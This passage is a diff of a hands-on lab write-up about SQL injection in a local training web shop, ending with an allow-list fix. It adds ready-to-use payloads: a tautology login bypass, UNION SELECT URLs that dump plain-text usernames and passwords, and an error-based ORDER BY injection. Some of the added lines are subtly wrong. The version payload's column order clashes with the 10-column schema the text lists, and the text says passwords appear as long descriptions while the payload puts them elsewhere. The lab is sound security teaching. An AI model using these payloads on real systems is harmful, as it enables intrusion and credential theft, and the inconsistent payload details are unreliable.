@@ -16,36 +16,37 @@ curl -s -D - -o /dev/null -X POST http://localhost:8888/login/auth \
 # Location: /   ← admin session
 ```
 
-Or the classic tautology: `username=' OR '1'='1` (logs you in as the first user).
+Or the classic tautology: `username=' OR '1'='1` (logs you in as the first user). Both work from the login page too — type them in the username box.
 
 ## Exploit 2: UNION on search
 
-`/search?q=` concatenates into `SELECT id, name, description, price_cents, image, stock, tags ...`. Seven columns; `tags` is `text[]`.
+`/search?q=` concatenates into `SELECT * FROM products ...` — 10 columns: `id, name, description, long_description, price_cents, image, stock, category, featured, tags` (`tags` is `text[]`, so it needs a `{v}` literal).
+
+1. Read the database version:
 
 ```text
-`/search?q=` concatenates into `SELECT * FROM products ...` (10 columns: id, name, description, long_description, price_cents, image, stock, category, featured, tags).
-
-```text
-http://localhost:8888/search?q=' UNION SELECT 1,version(),'d','l',0,'e',6,'c',false,'{v}'--
+http://localhost:8888/search?q=' UNION SELECT 1,version(),'d','l',0,'e','c',false,'{v}',6--
 ```
 
-The Postgres version banner appears as a product. Dump users (10 columns again):
+2. Dump the users table — username as product name, **password** as long description:
 
 ```text
 http://localhost:8888/search?q=' UNION SELECT 1,username,password,email,0,'e',6,'c',false,'{v}' FROM users--
 ```
 
-Usernames and password hashes (plain text here) appear as fake products.
+You get fake product cards: "alice" described by `alice123`, "bob" by `bob123`, "admin" by `admin123`. Full plain-text credentials, no hash cracking needed.
+
+3. (Debug mode adds contrast: `q='` alone renders the raw SQL error — see lab 09.)
 
 ## Exploit 3: ORDER BY injection
 
-`/orders?sort=` is interpolated (ORDER BY cannot be a bound parameter):
+`/orders?sort=` is interpolated (ORDER BY cannot be a bound parameter). Log in as any user, then:
 
 ```text
 http://localhost:8888/orders?sort=nope
 ```
 
-returns the SQL error — confirming injection. Boolean/error-based extraction works from here.
+returns the SQL error — confirming injection. From here, error-based extraction works (`sort=CASE WHEN (SELECT 1) THEN username ELSE id END`), and `sort=1`/`sort=amount_cents` show the query is fully attacker-shaped.
 
 ## Fix
 
@@ -64,4 +65,4 @@ const col = SORTS[req.query.sort] ?? "created_at";
 
 All three exploits return normal responses (401 / 0 results / default sort) after the fix.
 
-Related: lab 09 shows the SQL error text rendered on the page.
+Related: lab 09 shows the SQL error text rendered on the page; lab 01 shows what leaking those `orders` rows is worth.
